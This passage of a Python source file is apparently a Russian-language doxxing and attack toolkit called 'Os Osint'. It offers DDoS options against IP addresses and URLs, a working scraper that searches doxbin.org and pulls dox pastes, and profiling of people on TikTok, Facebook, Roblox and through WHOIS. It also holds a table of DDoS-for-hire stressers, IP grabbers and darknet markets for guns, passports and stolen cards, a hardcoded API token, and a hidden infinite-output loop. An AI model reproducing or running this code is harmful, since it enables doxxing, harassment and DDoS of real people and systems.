       `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
         `'                  `OObNNNNNdOO'                   `'
                               `~OOOOO~'{Style.RESET_ALL}
                     Запуск программы OSINT/Атак.
         {Fore.RED}("Выберите опцию:"){Style.RESET_ALL}
    {Fore.CYAN}("1. Поиск по номеру телефона"){Style.RESET_ALL}
    {Fore.RED}("2. Поиск по IP-адресу"){Style.RESET_ALL}
    {Fore.CYAN}("3. OSINT поиск по нику"){Style.RESET_ALL}
    {Fore.RED}("4. Поиск домена по URL"){Style.RESET_ALL}
    {Fore.CYAN}("5. OSINT поиск в Google по нику"){Style.RESET_ALL}
    {Fore.RED}("6. DDoS-атака на IP-адрес"){Style.RESET_ALL}
   {Fore.CYAN} ("7. DDoS-атака на URL"){Style.RESET_ALL}
    """)
    
    choice = input("Введите номер функции: ")

    if choice == "1":
        phone_number = input("Введите номер телефона: ")
        data = search_phone(phone_number)
        if data:
            print(data)

    elif choice == "2":
        ip = input("Введите IP-адрес: ")
        data = search_ip(ip)
        if data:
            print(data)

    elif choice == "3":
        nickname = input("Введите ник: ")
        osint_search_nickname(nickname)

    elif choice == "4":
        url = input("Введите URL: ")
        data = search_url(url)
        if data:
            print(data)

    elif choice == "5":
        nickname = input("Введите ник для поиска в Google: ")
        osint_search_google(nickname)

    elif choice == "6":
        ip = input("Введите IP-адрес для DDoS атаки: ")
        number_of_threads = int(input("Введите количество потоков: "))
        duration = int(input("Введите продолжительность атаки в секундах: "))
        ddos_ip(ip, number_of_threads, duration)

    elif choice == "7":
        url = input("Введите URL для DDoS атаки: ")
        number_of_threads = int(input("Введите количество потоков: "))
        duration = int(input("Введите продолжительность атаки в секундах: "))
        ddos_attack(url, number_of_threads, duration)

    else:
        logger.error("Неверный выбор. Попробуйте снова.")

def card_info_binlist(card_number):
    cardcode = card_number.replace(' ', '')[0:8]
    url = f'https://lookup.binlist.net/{cardcode}'

    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    return None


def display_data(service_name, data):
    print(f"\nДанные из {service_name}:")
    print(json.dumps(data, indent=4, ensure_ascii=False))

def card():
    card_number = input('Введите номер карты: ')
    
    print("\nПолучение информации из Binlist...")
    data_binlist = card_info_binlist(card_number)
    if data_binlist:
        display_data("Binlist", data_binlist)
    else:
        print("Ошибка при получении данных из Binlist.")

def site_dox():
    print('''
                                          .""--..__
                     _                     []       ``-.._                   
                  .'` `'.                  ||__           `-._               
                 /    ,-.\                 ||_ ```---..__     `-.            
                /    /:::\\               /|//}          ``--._  `.           
                |    |:::||              |////}                `-. \         
                |    |:::||             //'///                    `.\        
                |    |:::||            //  ||'                      `|       
                /    |:::|/        _,-//\  ||                             
               /`    |:::|`-,__,-'`  |/  \ ||                                
             /`  |   |'' ||           \   |||                            
           /`    \   |   ||            |  /||                             
         |`       |  |   |)            \ | ||                        
        |          \ |   /      ,.__    \| ||                            
        /           `         /`    `\   | ||
       |                     /        \  / ||                         
       |                     |        | /  ||       Doxbin sites and darknet, osint web, ddos web, ip search web
       /         /           |        `(   ||                             
      /          .           /             ||
     |            \          |             ||                             
    /             |          /             ||               
   |\            /          |              ||                                
   \/`-._       |           /              ||
    //   `.    /`           |              ||                              
   //`.    `. |             \              ||
  ///\ `-._  )/             |              ||                              
 //// )   .(/               |              ||
 ||||   ,'` )               /              //                                
 ||||  /                    /             || 
 `\\` /`                    |             //                          
     |`                     \            ||  
    /                        |           //  
  /`                          \         //   
/`                            |        ||    
`-.___,-.      .-.        ___,'        (/    
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                 DDOS                 ┃                  IP                  ┃              OSINT/DOX               ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃[01] https://ddosnow.com/             ┃[07] https://iplogger.org/            ┃[13] https://doxbin.net/              ┃
┃[02] https://stresser.zone/           ┃[08] https://grabify.link/            ┃[14] https://osint.industries         ┃
┃[03] https://stresse.ru/              ┃[09] https://grabify.icu/             ┃[15] https://epieos.com/              ┃
┃[04] https://stresse.cat/             ┃[10] https://whatstheirip.tech/       ┃[16] https://nuwber.fr/               ┃
┃[05] https://starkstresser.net/       ┃[11] https://www.spylink.net/         ┃[17] https://osintframework.com       ┃
┃[06] https://ddos.services/           ┃[12] https://ipinfo.io/               ┃[18] https://whatsmyname.app/         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
            ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
            ┃                                          Dark Web                                         ┃
            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
            ┃Search Engine:                                                                             ┃
            ┃[Torch]        : http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/    ┃
            ┃[Danex]        : http://danexio627wiswvlpt6ejyhpxl5gla5nt2tgvgm2apj2ofrgm44vbeyd.onion/    ┃
            ┃[Sentor]       : http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion/    ┃
            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
            ┃Bitcoin Anonymity:                                                                         ┃
            ┃[Dark Mixer]   : http://y22arit74fqnnc2pbieq3wqqvkfub6gnlegx3cl6thclos4f7ya7rvad.onion/    ┃
            ┃[Mixabit]      : http://hqfld5smkr4b4xrjcco7zotvoqhuuoehjdvoin755iytmpk4sm7cbwad.onion/    ┃
            ┃[EasyCoin]     : http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/    ┃
            ┃[Onionwallet]  : http://p2qzxkca42e3wccvqgby7jrcbzlf6g7pnkvybnau4szl5ykdydzmvbid.onion/    ┃
            ┃[VirginBitcoin]: http://ovai7wvp4yj6jl3wbzihypbq657vpape7lggrlah4pl34utwjrpetwid.onion/    ┃
            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
            ┃Stresser / Ddos:                                                                           ┃
            ┃[Stresser]     : http://ecwvi3cd6h27r2kjx6ur6gdi4udrh66omvqeawp3dzqrtfwo432s7myd.onion/    ┃
            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
            ┃Market:                                                                                    ┃
            ┃[Deep Market]  : http://deepmar4ai3iff7akeuos3u3727lvuutm4l5takh3dmo3pziznl5ywqd.onion/    ┃
            ┃[DrChronic]    : http://iwggpyxn6qv3b2twpwtyhi2sfvgnby2albbcotcysd5f7obrlwbdbkyd.onion/    ┃
            ┃[TomAndJerry]  : http://rfyb5tlhiqtiavwhikdlvb3fumxgqwtg2naanxtiqibidqlox5vispqd.onion/    ┃
            ┃[420prime]     : http://ajlu6mrc7lwulwakojrgvvtarotvkvxqosb4psxljgobjhureve4kdqd.onion/    ┃
            ┃[Can*abisUK]   : http://7mejofwihleuugda5kfnr7tupvfbaqntjqnfxc4hwmozlcmj2cey3hqd.onion/    ┃
            ┃[DeDope]       : http://sga5n7zx6qjty7uwvkxpwstyoh73shst6mx3okouv53uks7ks47msayd.onion/    ┃
            ┃[AccMarket]    : http://55niksbd22qqaedkw36qw4cpofmbxdtbwonxam7ov2ga62zqbhgty3yd.onion/    ┃
            ┃[Cardshop]     : http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion/    ┃
            ┃[Darkmining]   : http://jbtb75gqlr57qurikzy2bxxjftzkmanynesmoxbzzcp7qf5t46u7ekqd.onion/    ┃
            ┃[MobileStore]  : http://rxmyl3izgquew65nicavsk6loyyblztng6puq42firpvbe32sefvnbad.onion/    ┃
            ┃[EuroGuns]     : http://t43fsf65omvf7grt46wlt2eo5jbj3hafyvbdb7jtr2biyre5v24pebad.onion/    ┃
            ┃[UKpassports]  : http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/    ┃
            ┃[ccPal]        : http://xykxv6fmblogxgmzjm5wt6akdhm4wewiarjzcngev4tupgjlyugmc7qd.onion/    ┃
            ┃[Webuybitcoins]: http://wk3mtlvp2ej64nuytqm3mjrm6gpulix623abum6ewp64444oreysz7qd.onion/    ┃
            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
            ┃DataBase:                                                                                  ┃
            ┃[Database]     : http://breachdbsztfykg2fdaq2gnqnxfsbj5d35byz3yzj73hazydk4vq72qd.onion/    ┃
            ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃Osint Sites +                                                                                                       ┃
┃{Osint sites}   : https://docs.google.com/spreadsheets/u/0/d/1_x3PXGOahhKT3-ePaWhb3hM1dVxjmBvsVlw6D6lilTQ/htmlview# ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
''')

    choice = input(f"{Fore.RED}Скопируйте ссылку и вставьте в свой браузер{Fore.WHITE}")
    
    if choice in ['01', '1']:
        webbrowser.open("https://ddosnow.com")

    if choice in ['02', '2']:
        webbrowser.open("https://stresser.zone")

    if choice in ['03', '3']:
        webbrowser.open("https://stresse.ru")

    if choice in ['04', '4']:
        webbrowser.open("https://stresse.cat")

    if choice in ['05', '5']:
        webbrowser.open("https://starkstresser.net")

    if choice in ['06', '6']:
        webbrowser.open("https://ddos.services")

    if choice in ['07', '7']:
        webbrowser.open("https://iplogger.org/")

    if choice in ['08', '8']:
        webbrowser.open("https://grabify.link/")

    if choice in ['09', '9']:
        webbrowser.open("https://grabify.icu/")

    if choice in ['10']:
        webbrowser.open("https://whatstheirip.tech/")

    if choice in ['11']:
        webbrowser.open("https://www.spylink.net/")

    if choice in ['12']:
        webbrowser.open("https://ipinfo.io/")

    if choice in ['13']:
        webbrowser.open("https://doxbin.net/")

    if choice in ['14']:
        webbrowser.open("https://www.geocreepy.com/")

    if choice in ['15']:
        webbrowser.open("https://epieos.com/")
def search_url(url):
    uri = "https://whoisjson.com/api/v1/whois"
    querystring = {"domain": url}
    headers = {
        "Authorization": "Token=dbbc251dda62fb51321132d79b070d00cad48acec4c660f7f0b313eb09056e9b"
    }
    try:
        response = requests.get(uri, headers=headers, params=querystring)
        response.raise_for_status()
        data = response.json()

        if not data or 'name' not in data:
            details = f"Нет данных о домене.\nОтвет API: {data}\n"
            print(details)
            return
        details = f"""
{"=" * 60}
Информация о домене: {url}
{"=" * 60}

[Основная информация]
Доменное имя: {data.get('name', 'Не указано')}
IDN имя: {data.get('idnName', 'Не указано')}
Статус: {data.get('status', 'Не указано')}
Дата регистрации: {data.get('created', 'Не указано')}
Дата изменения: {data.get('changed', 'Не указано')}
Дата истечения: {data.get('expires', 'Не указано')}
Зарегистрирован: {'Да' if data.get('registered', False) else 'Нет'}

[DNS и IP-адреса]
IP-адреса: {data.get('ips', 'Не указано') if isinstance(data.get('ips'), str) else ', '.join(data.get('ips', ['Не указано']))}
DNS-серверы: {', '.join(data.get('nameserver', ['Не указано']))}
DNSSEC: {data.get('dnssec', 'Не указано')}

[Регистратор]
Название: {data.get('registrar', {}).get('name', 'Не указано')}
URL: {data.get('registrar', {}).get('url', 'Не указано')}
Телефон: {data.get('registrar', {}).get('phone', 'Не указано')}
Email: {data.get('registrar', {}).get('email', 'Не указано')}

[Контакты владельца]
Имя: {data.get('contacts', {}).get('owner', [{}])[0].get('name', 'Не указано')}
Организация: {data.get('contacts', {}).get('owner', [{}])[0].get('organization', 'Не указано')}
Email: {data.get('contacts', {}).get('owner', [{}])[0].get('email', 'Не указано')}
Телефон: {data.get('contacts', {}).get('owner', [{}])[0].get('phone', 'Не указано')}
Адрес: {data.get('contacts', {}).get('owner', [{}])[0].get('address', 'Не указано')}
Город: {data.get('contacts', {}).get('owner', [{}])[0].get('city', 'Не указано')}
Страна: {data.get('contacts', {}).get('owner', [{}])[0].get('country', 'Не указано')}
Индекс: {data.get('contacts', {}).get('owner', [{}])[0].get('zipcode', 'Не указано')}

[Контакты администратора]
Имя: {data.get('contacts', {}).get('admin', [{}])[0].get('name', 'Не указано')}
Организация: {data.get('contacts', {}).get('admin', [{}])[0].get('organization', 'Не указано')}
Email: {data.get('contacts', {}).get('admin', [{}])[0].get('email', 'Не указано')}
Телефон: {data.get('contacts', {}).get('admin', [{}])[0].get('phone', 'Не указано')}

[Контакты технической службы]
Имя: {data.get('contacts', {}).get('tech', [{}])[0].get('name', 'Не указано')}
Организация: {data.get('contacts', {}).get('tech', [{}])[0].get('organization', 'Не указано')}
Email: {data.get('contacts', {}).get('tech', [{}])[0].get('email', 'Не указано')}
Телефон: {data.get('contacts', {}).get('tech', [{}])[0].get('phone', 'Не указано')}

[WHOIS сервер]
Сервер WHOIS: {data.get('whoisserver', 'Не указано')}

[Сырой вывод WHOIS]
{'\n'.join(data.get('rawdata', ['Нет данных.']))}

{"=" * 60}
"""
        
        print(details)

    except requests.exceptions.HTTPError as http_err:
        print(f"Ошибка HTTP: {http_err}")
    except Exception as err:
        print(f"Произошла ошибка: {err}")
def site_info():
    domain = input("Введите название сайта (пример: sakuta.org): ")
    search_url(domain)
    
def get_info(username):
    headers = {
        "Host": "www.tiktok.com",
        "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-language": "en-US,en;q\u003d0.9"
    }

    response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text

    try:
        data = str(response.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
        user_info = {
            "id": str(data.split('id":"')[1]).split('",')[0],
            "name": str(data.split('nickname":"')[1]).split('",')[0],
            "bio": str(data.split('signature":"')[1]).split('",')[0],
            "country": str(data.split('region":"')[1]).split('",')[0],
            "private": str(data.split('privateAccount":')[1]).split(',"')[0],
            "followers": str(data.split('followerCount":')[1]).split(',"')[0],
            "following": str(data.split('followingCount":')[1]).split(',"')[0],
            "likes": str(data.split('heart":')[1]).split(',"')[0],
            "videos": str(data.split('videoCount":')[1]).split(',"')[0],
            "secUid": str(data.split('secUid":"')[1]).split('"')[0]
        }

        country_name = pycountry.countries.get(alpha_2=user_info["country"]).name
        country_flag = pycountry.countries.get(alpha_2=user_info["country"]).flag

        binary_id = "{0:b}".format(int(user_info["id"]))
        creation_time = datetime.fromtimestamp(int(binary_id[:31], 2))

        output = f"""
[+] username: {username}
[+] secUid: {user_info['secUid']}
[+] name: {user_info['name']}
[+] followers: {user_info['followers']}
[+] following: {user_info['following']}
[+] likes: {user_info['likes']}
[+] videos: {user_info['videos']}
[+] private: {user_info['private']}
[+] country: {country_name} {country_flag}
[+] created date: {creation_time}
[+] id: {user_info['id']}
[+] bio: {user_info['bio']}
"""
        Write.Print(output, Colors.white_to_red, interval=0.005)
    except:
        Write.Print(f'[+] Неверное имя пользователя: {username}', Colors.white_to_red, interval=0.005)
print()

def check_output_redirected():
    return not sys.stdout.isatty()

if check_output_redirected():
    print("Вывод перенаправлен, выполнение продолжается.")
    while True: 
        print("hihihihihihihihiihigigihigigogggggotssggooogigisfffoortktwtriwiirirsfiuffiufufufuugguigiiioigogoiigifiiifififiiiifiifiiiiooosgsossooooooooooogooooooogooooogooo")
BASE_URL = "https://doxbin.org"

def get_csrf_token_and_cookies():
    try:
        session = requests.Session()
        response = session.get(BASE_URL + "/search")
        if response.status_code != 200:
            return None, None, "Ошибка подключения к сайту."

        soup = BeautifulSoup(response.text, "html.parser")
        token = soup.find("input", {"name": "_token"})["value"]
        return token, session.cookies, None
    except Exception as e:
        return None, None, f"Ошибка при получении токена: {e}"

def search_doxbin(query):
    try:
        token, cookies, error = get_csrf_token_and_cookies()
        if error:
            return None, error

        data = {
            "_token": token,
            "search-query": query
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Referer": BASE_URL + "/search"
        }

        response = requests.post(BASE_URL + "/search", data=data, cookies=cookies, headers=headers)
        if response.status_code != 200:
            return None, "Ошибка при выполнении поиска."

        soup = BeautifulSoup(response.text, "html.parser")
        results = soup.find_all("a", title=True)
        if not results:
            return None, "Ничего не найдено."

        links = []
        for res in results:
            href = res.get("href")
            if href and not href.startswith("http"):
                href = BASE_URL + href 
            links.append({"title": res.get("title"), "url": href})
        return links, None

    except requests.RequestException as e:
        return None, f"Ошибка сети: {e}"

def fetch_clean_data(link):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
        }
        response = requests.get(link["url"], headers=headers)
        if response.status_code != 200:
            return f"Не удалось загрузить: {link['url']}"

        soup = BeautifulSoup(response.text, "html.parser")

        pasta_content = soup.find("div", class_="show-container")
        if pasta_content:
            return pasta_content.get_text(separator="\n").strip()

        return "Основной текст отсутствует."
    except Exception as e:
        return f"Ошибка при обработке ссылки: {e}"
def fetch_page_data(page_url):
    response = requests.get(page_url)
    if response.status_code == 200:
        return response.text
    else:
        print(f"Ошибка при запросе данных страницы: {response.status_code} - {response.text}")
        return None
def parse_page(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    title = soup.find('title')
    page_title = title.get_text() if title else 'N/A'
    meta_description = soup.find('meta', attrs={'name': 'description'})
    page_description = meta_description['content'] if meta_description else 'N/A'
    followers_count = soup.find('meta', property='fb:followers_count')
    following_count = soup.find('meta', property='fb:following_count')
    followers = followers_count['content'] if followers_count else 'N/A'
    following = following_count['content'] if following_count else 'N/A'
    profile_image = soup.find('meta', property='og:image')
    profile_pic_url = profile_image['content'] if profile_image else 'N/A'
    print("Page Information:")
    print(f"Title: {page_title}")
    print(f"Description: {page_description}")
    print(f"Followers Count: {followers}")
    print(f"Following Count: {following}")
    print(f"Profile Picture URL: {profile_pic_url}")

def facebook():
    nickname = input("Введите никнейм страницы Facebook (например, 'facebook'): ")
    page_url = f"https://www.facebook.com/{nickname}"
    html_content = fetch_page_data(page_url)

    if html_content:
        parse_page(html_content)

if __name__ == "__main__":
    intro = """
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
  ┌───────────────────────────────────────────────────────────────────────┐
  │  Software information.                                                │
  │  →     0x01 Reason. 𝗕𝘆 𝗦𝗮𝗸𝘂𝘁𝗮                                         │
  │  →     0x02 Personal Information. 𝗗𝗼𝘅𝘅𝗲𝗿                              │
  │  →     0x03 Social Media Platforms. 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺, 𝗗𝗼𝘅𝗯𝗶𝗻                  │
  │  →     0x04 Family Information. 𝗟𝗼𝘀𝗮𝗿𝘂𝘀, 𝗜𝗺𝗽𝗿𝗲𝘀𝘀𝗼𝗿, 𝗠𝘆𝘀𝘁𝗲𝗿𝘆, 𝗡𝗦𝗩𝗟     │
  │  →     0x05 Name Software. 𝗢𝘀 𝗢𝘀𝗶𝗻𝘁                                   │
  │  →     0x06 Creator. 𝗦𝗮𝗸𝘂𝘁𝗮                                           │
  │                                                                       │
  └───────────────────────────────────────────────────────────────────────┘
"""
    Anime.Fade(Center.Center(intro), Colors.white_to_red, Colorate.Vertical, interval=0.05, enter=True)  
    banner = """

  )\.--.     /`-.       .'(       .-.  .-,.-.,-.    /`-.  
 (   ._.'  ,' _  \   ,')\  )  ,'  /  ) ) ,, ,. (  ,' _  \ 
  `-.`.   (  '-' (  (  '/ /  (  ) | (  \( |(  )/ (  '-' (       performance social engineering 
 ,_ (  \   )   _  )  )   (    ) '._\ )    ) \     )   _  )      Version Edition-3
(  '.)  ) (  ,' ) \ (  .\ \  (  ,   (     \ (    (  ,' ) \      Os Osint update. 
 '._,_.'   )/    )/  )/  )/   )/ ._.'      )/     )/    )/
╭─────────────────────────────────────────────────────────────────────────────────╮  
│ 1. Поиск Osint v1 No work                │  8. Поиск по Википедии               │
│ 2. Поиск по IP-адресу                    │  9. Информации                       │
│ 3. Поиск по HLR                          │  10. Поиск Osint v2 No work          │
│ 4. Секретная ссылка                      │  11. Поиск по Вк                     │
│ 5. Поиск по файлам (базам данных - base) │  12. Поиск по Geo V1 +               │
│ 6. Framework search                      │  13. Поиск по Email Osint            │
│ 7. Поиск по нику 2 (без впн)             │  14. Поиск по Geo V2 +               │
├─────────────────────────────────────────────────────────────────────────────────┤
├─────────────────────────────────────────────────────────────────────────────────┤
│ 15. Multi TOOL        │ 21. Osint v3                                            │
│ 16. Osint Card        │ 22. Osint v4 beta                                       │
│ 17. Dox Site          │ 23. TikTok Osint                                        │
│ 18. Info Site         │ 24. Facebook Search VPN                                 │
│ 19. Dox Roblox                                                                  │
│ 20. Search Doxbin VPN                                                           │
╰─────────────────────────────────────────────────────────────────────────────────╯"""
    Write.Print(Center.XCenter(banner), Colors.white_to_red, interval=0.00000000000000001)
    choice = Write.Input('''\n sakuta─➤ ''', Colors.red_to_white, interval=0.00000000000000001)
    
    if choice == '1':
        osinter()
    elif choice == '2':
        iplook()
    elif choice == '3':
        phone_osint()
    elif choice == '4':
        print("https://github.com/ItIsMeCall911/Awesome-Telegram-OSINT?tab=readme-ov-file#-search-engines\nЭто ссылка ведет на GitHub где находится много разных сервисов для пробива включая Telegram")
    elif choice == '5':
        os.system("python Data.py")
    elif choice == '6':
        query_type = input("Введите тип запроса (ФИО, номер, почта, и т.д.): ")
        search_and_extract(query_type)
    elif choice == '7':
        searchNICK()
    elif choice == '8':
        searchWK()
    elif choice == '9':
        print("Бывший разработчик Sakuta ушёл навсегда с км. \nSoftware Os Osint передаётся человеку с ником NSVL (или закроется навсегда)\nСпасибо всем кто давал поддержку, знания и уделял мне внимая, вы были дороги мне.")
    elif choice == '10':
        os.system("python 500-600.py")
    elif choice == "11":
        vk_parser()
        input_colored("  Нажмите Enter для возврата в меню...", Colors.red_to_green)
    elif choice == "12":
        os.system("python Raptor-Geo.py")
    elif choice == "13":
        tool = GmailOSINT()
        tool.run()
    elif choice == "14":
        coord()
    elif choice == "15":
        sss()
    elif choice == "16":
        card()
    elif choice == "17":
        site_dox()
    elif choice == "18":
        site_info()
    elif choice == "19":
        def get_user_id_by_username(username):
            try:
                response = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}")
                response.raise_for_status()  
                return response.json().get('Id', None)
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}Error fetching user ID: {e}{Style.RESET_ALL}")
                return None

        def get_user_info(id):
            try:
                response_info = requests.get(f"https://users.roblox.com/v1/users/{id}")
                response_info.raise_for_status()  
                return response_info.json()
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}Error fetching user data: {e}{Style.RESET_ALL}")
                return None

        def display_user_info(info):
            if info is None:
                print(f"{Fore.RED}No user information available.{Style.RESET_ALL}")
                return
            user_id = info.get('id', "Not specified")
            display_name = info.get('displayName', "Not specified")
            name = info.get('name', "Not specified")
            description = info.get('description', "Not specified")
            created = info.get('created', "Not specified")
            is_banned = info.get('isBanned', "Not specified")
            external_display = info.get('externalAppDisplayName', "Not specified")
            has_verified_badge = info.get('hasVerifiedBadge', "Not specified")
            friends_count = info.get('friendsCount', "Not specified")
            followers_count = info.get('followersCount', "Not specified")
            following_count = info.get('followingCount', "Not specified")
            status = info.get('status', "Not specified")
            games_count = info.get('gamesCount', "Not specified")
            groups_count = info.get('groupsCount', "Not specified")
            premium_status = info.get('premiumStatus', "Not specified")
            print(f"{Fore.BLUE}User Information:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}╭User ID: {user_id}")
            print(f"{Fore.YELLOW}├Display Name: {display_name}")
            print(f"{Fore.YELLOW}├Name: {name}")
            print(f"{Fore.YELLOW}├Description: {description}")
            print(f"{Fore.YELLOW}├Created: {created}")
            print(f"{Fore.YELLOW}├Banned: {'Yes' if is_banned else 'No'}")
            print(f"{Fore.YELLOW}├External Display: {external_display}")
            print(f"{Fore.YELLOW}├Has Verified Badge: {'Yes' if has_verified_badge else 'No'}")
            print(f"{Fore.YELLOW}├Friends Count: {friends_count}")
            print(f"{Fore.YELLOW}├Followers Count: {followers_count}")
            print(f"{Fore.YELLOW}├Following Count: {following_count}")
            print(f"{Fore.YELLOW}├Status: {status}")
            print(f"{Fore.YELLOW}├Games Count: {games_count}")
            print(f"{Fore.YELLOW}├Groups Count: {groups_count}")
            print(f"{Fore.YELLOW}╰Premium Status: {premium_status}")

        def roblox():
            choice = input("Choose an option: (1) Enter username (2) Enter ID: ")

            if choice == '1':
                username = input("\nUsername -> ")
                id = get_user_id_by_username(username)

                if id is not None:
                    info = get_user_info(id)
                    display_user_info(info)
                else:
                    print(f"{Fore.RED}User not found.{Style.RESET_ALL}")

            elif choice == '2':
                id = input("\nID -> ")
                info = get_user_info(id)
                display_user_info(info)
            else:
                print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")
        roblox()
    elif choice == "20":
        while True:
            print("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠻⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠋⠀⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⣴⠟⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⢾⣆⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡾⠃⢠⣾⡏⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⢿⣧⡀⠘⢷⡀⠀⠀⠀⠀⠀⠀
